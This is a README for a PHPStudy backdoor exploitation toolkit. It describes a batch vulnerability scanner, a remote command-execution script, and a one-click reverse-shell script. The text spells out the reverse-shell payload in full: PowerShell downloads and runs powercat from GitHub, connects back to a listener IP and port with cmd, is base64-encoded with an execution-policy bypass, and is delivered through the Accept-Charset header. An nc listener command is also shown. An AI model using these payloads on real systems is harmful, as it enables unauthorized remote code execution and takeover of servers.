# PHPStudy_BackDoor

### phpstudy_backdoor_poc.py
	多进程批量检测脚本，自动读取urls.txt中内容，然后进行批量检测
	检测结果如发现漏洞会存入phpstudy_backdoor_urls.txt中

##### 运行demo：
```
python phpstudy_backdoor_poc.py

[+] http://127.0.0.1 is vulnerable.
[-] http://192.168.1.1 is invulnerable.
[*] http://192.168.1.2 Looks Like Something Wrong.
[*] http://192.168.1.3 Looks Like Something Wrong.
```

### phpstudy_backdoor_exp.py
	漏洞利用脚本，操作精简。
	Usage: python3 phpstudy_backdoor_exp.py [url] [command]

##### 运行demo：
```
python phpstudy_backdoor_exp.py 127.0.0.1 whoami

[+] Command Execute Successful.
rabbitmask\rabbitmask
```

### phpstudy_backdoor_shell.py
	脚本一键反弹shell，自动bypass，关于原理后边给教程，借助了powercat、powershell等，
	所以请在powershell中执行`set-executionpolicy remotesigned`允许脚本执行。
	Usage: python3 phpstudy_backdoor_exp.py [url]
	#请配置监听地址与端口
	listen_host='192.168.1.254'
	listen_port='6666'
	
```
#第一步借助powershell配置反弹shell的payload并加密
$text = "IEX (New-Object  System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.1.254 -p 6666 -e cmd;" 
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text) 
$EncodedText =[Convert]::ToBase64String($Bytes) 
$EncodedText > bs64.txt

#第二步借助powershell进行bypass的处理
system('powershell -exec bypass -encodedcommand [bs64.txt内容]');

#第三步base64加密交给Accept-Charset参数提交payload
Accept-Charset: [base64(bypass)]
```


##### 运行demo：
```
python phpstudy_backdoor_shell.py 127.0.0.1

nc -lvvp [port]
```

